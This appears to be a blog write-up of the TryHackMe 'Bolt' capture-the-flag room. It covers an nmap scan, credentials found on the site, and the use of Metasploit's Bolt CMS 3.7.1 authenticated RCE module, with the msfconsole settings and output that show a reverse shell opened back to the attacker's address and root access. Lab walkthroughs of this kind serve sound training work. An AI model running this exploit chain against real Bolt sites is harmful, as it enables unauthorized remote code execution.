---
title: Bolt - Tryhackme
author: Sarang P
date: 2021-10-09 09:30:00 +0530
categories: [Tryhackme]
tags: [security, web, cve, bolt, RCE]
---

![](/assets/img/posts/bolt/1.png)

Room : [https://tryhackme.com/room/Bolt](https://tryhackme.com/room/Bolt)

Author : [0x9747](https://twitter.com/0x9747/)

## Reconnaissance:

lets start with `nmap` scan 

```bash
┌──(de4dl0ck㉿kali)-[~/thm/bolt]
└─$ nmap -p 22,80,8000 -A 10.10.101.136 --min-rate 10000
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 14:21 IST
Nmap scan report for 10.10.101.136
Host is up (0.40s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    (PHP 7.2.32-1)

```

There are 3 ports are open, on port 80 Apache2 Ubuntu Default Page  is running.

![](/assets/img/posts/bolt/2.png)

Looking at port 8000 we get webpage called Bolt A hero is unleashed. The webpage running on `Bolt CMS 3.7.1`

![](/assets/img/posts/bolt/3.png)

While going through webpage we can see credentials a username and password on article

![](/assets/img/posts/bolt/4.png)

![](/assets/img/posts/bolt/5.png)

## Foothold:

There is a wellknown exploit on Bolt CMS 3.7.1 that is authenticated RCE ([EDB-ID](https://www.exploit-db.com/exploits/48296):48296) 

![](/assets/img/posts/bolt/7.png)

We can get same exploit on metasploit module

![](/assets/img/posts/bolt/6.png)


Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

```bash

msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.206.103
RHOSTS => 10.10.206.103
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST tun0
LHOST => 10.4.51.77
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD {--REDACTED--}
PASSWORD => {--REDACTED--}
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
```
We can get flag from `/home` directory.

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.4.51.77:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "yestv".
[*] Found 2 potential token(s) for creating .php files.
[+] Deleted file vejeogxtqsvv.php.
[+] Used token c3a4db83bdf4026bdba7efa72c to create qkwuxangjd.php.
[*] Attempting to execute the payload via "/files/qkwuxangjd.php?yestv=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.4.51.77:4444 -> 10.10.206.103:41336) at 2021-10-09 21:06:08 +0530
[+] Deleted file qkwuxangjd.php.
[+] Reverted user profile back to original state.

id
uid=0(root) gid=0(root) groups=0(root)
hostname
bolt
cat flag.txt
THM{--REDACTED--}
```

### Thank you for reading my writeup
